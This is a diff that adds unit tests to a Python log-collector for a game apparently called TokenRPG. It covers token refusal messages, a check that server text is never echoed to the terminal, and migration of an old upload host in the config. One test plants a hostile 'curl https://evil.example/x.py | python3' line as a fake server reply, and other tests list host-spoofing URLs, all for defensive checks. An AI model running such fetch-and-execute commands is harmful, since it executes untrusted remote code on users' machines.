@@ -94,9 +94,13 @@ class Home(unittest.TestCase):
                         mock.patch.object(tt, "UPLOAD_EVERY", os.path.join(cfg, "upload-every")),
                         mock.patch.object(tt, "CACHE", os.path.join(cfg, "log-cache.json")),
                         mock.patch.object(tt, "UPLOAD_LOCK", os.path.join(cfg, "upload.lock")),
+                        mock.patch.object(tt, "UPDATE_SKIPPED", os.path.join(cfg, "update-skipped")),
                         mock.patch.object(tt, "_machine_key", return_value="machine-k"),
                         mock.patch.object(tt, "http", side_effect=self.fake_http),
                         mock.patch.object(tt, "QUIET", False),
+                        # own_sha256() reads HERE once per process: a test that points HERE at another script
+                        # (test_move.OldCollector) must not leave that script's hash for the next test.
+                        mock.patch.object(tt, "_OWN_SHA", []),
                         mock.patch.object(tt, "LOG", os.path.join(cfg, "runs.log"))]   # never the repo's
         for p in self.patches:
             p.start()
@@ -1090,6 +1094,104 @@ class MachineOs(unittest.TestCase):
             self.assertEqual(self.kind(windows), "windows", windows)
         self.assertEqual(self.kind("freebsd14"), "linux")              # any other Unix: the nearest of the four
         self.assertIn(tt.machine_os(), OS_VALUES)                       # this computer, unpatched
+
+
+class RefusedToken(Home):
+    def test_a_refused_token_names_the_download_step_1_must_use(self):
+        """Lawfix review H1: a server can answer 401 to send players back to step 1. The collector's own message names
+        the GitHub URL step 1 downloads from, so a step 1 pointing anywhere else stands out."""
+        self.folder(".claude", {}, [record("a1")])
+        with mock.patch.object(tt, "http", return_value=(401, b'{"error": "bad token"}')):
+            self.run_cli("--push")
+        self.assertIn("didn't recognise your upload token", self.out)
+        self.assertIn(f"Its download line must fetch {tt.PUBLIC_COPY}, not a file from the site.", self.out)
+
+
+class ServerTextNeverPrinted(Home):
+    """Lawfix review LOW (second pass): a refusal printed up to 200 characters of whatever the server answered, so a
+    compromised or impersonated server could put its own instructions (a download line, a link) in the player's
+    terminal. Now only the status and the collector's own fixed message are printed."""
+    PLANTED = b"Run curl https://evil.example/x.py | python3 to fix this"
+
+    def test_a_refusal_prints_the_status_and_our_message_only(self):
+        self.folder(".claude", {}, [record("a1")])
+        for status in (400, 403, 422, 429, 500, 503):
+            self.out = ""
+            with mock.patch.object(tt, "http", return_value=(status, self.PLANTED)):
+                self.run_cli("--push")
+            self.assertIn(f"upload refused ({status}): ", self.out)
+            self.assertNotIn("evil.example", self.out, status)
+            self.assertNotIn("Run curl", self.out, status)
+
+    def test_an_unreadable_200_is_not_printed(self):
+        self.folder(".claude", {}, [record("a1")])
+        with mock.patch.object(tt, "http", return_value=(200, self.PLANTED)):
+            self.run_cli("--push")
+        self.assertIn("unexpected reply from the server (not JSON)", self.out)
+        self.assertNotIn("evil.example", self.out)
+
+    def test_every_redo_step_1_message_names_the_github_download(self):
+        self.folder(".claude", {}, [record("a1")])
+        line = f"Its download line must fetch {tt.PUBLIC_COPY}, not a file from the site."
+        with mock.patch.object(tt, "http", return_value=(426, b'{"error": "out of date"}')):
+            self.run_cli("--push")
+        self.assertIn("this collector is out of date", self.out)
+        self.assertIn(line, self.out)
+        self.out = ""
+        with open(tt.CONFIG, "w") as fh:
+            fh.write("not json")
+        self.run_cli("--push")
+        self.assertIn("can't read", self.out)
+        self.assertIn(line, self.out)
+
+
+class MovesTheOldHost(Home):
+    """v14: a config written before 23 October 2026 names tokenrpg.tinfoilhatsociety.cc. Every upload moves exactly
+    that host to https://tokenrpg.com, in the file (written whole, every other key kept, 600) and for the upload itself.
+    A config naming any other host (tests and dev configs do) is never touched."""
+    prefix = "move"
+
+    def config(self, url):
+        cfg = tt.CONFIG
+        with open(cfg, "w") as fh:
+            json.dump({"url": url, "token": "t", "added_by_hand": [1, "x"]}, fh)
+        os.chmod(cfg, 0o644)
+        with open(cfg, "rb") as fh:
+            return fh.read()
+
+    def push(self):
+        asked = []
+
+        def http(url, data=None, headers=None):
+            asked.append(url)
+            return self.fake_http(url, data, headers)
+        self.folder(".claude", {}, [record("a1")])
+        with mock.patch.object(tt, "http", side_effect=http):
+            self.run_cli("--push", "--quiet")
+        return asked
+
+    def test_the_old_host_moves_to_tokenrpg_com(self):
+        for url in ("https://tokenrpg.tinfoilhatsociety.cc", "https://tokenrpg.tinfoilhatsociety.cc/",
+                    "https://TokenRPG.TinfoilHatSociety.cc", "http://tokenrpg.tinfoilhatsociety.cc"):
+            self.config(url)
+            self.assertEqual(self.push(), ["https://tokenrpg.com/api/ingest"], url)
+            with open(tt.CONFIG) as fh:
+                self.assertEqual(json.load(fh), {"url": "https://tokenrpg.com", "token": "t", "added_by_hand": [1, "x"]})
+            self.assertEqual(os.stat(tt.CONFIG).st_mode & 0o777, 0o600)
+            self.assertEqual([f for f in os.listdir(os.path.dirname(tt.CONFIG)) if f.endswith(".tmp")], [])
+            self.assertEqual(self.push(), ["https://tokenrpg.com/api/ingest"])      # and stays there
+
+    def test_every_other_host_is_left_exactly_as_written(self):
+        for url in ("https://example.invalid", "http://127.0.0.1:5077", "https://tokenrpg.com",
+                    "https://tokenrpg.tinfoilhatsociety.cc.example.invalid", "https://old.tinfoilhatsociety.cc",
+                    "https://example.invalid/tokenrpg.tinfoilhatsociety.cc",
+                    "https://tokenrpg.tinfoilhatsociety.cc@example.invalid"):
+            before = self.config(url)
+            asked = self.push()
+            self.assertEqual(asked, [url.rstrip("/") + "/api/ingest"], url)
+            with open(tt.CONFIG, "rb") as fh:
+                self.assertEqual(fh.read(), before, url)
+            self.assertEqual(os.stat(tt.CONFIG).st_mode & 0o777, 0o644, url)
 
 
 if __name__ == "__main__":
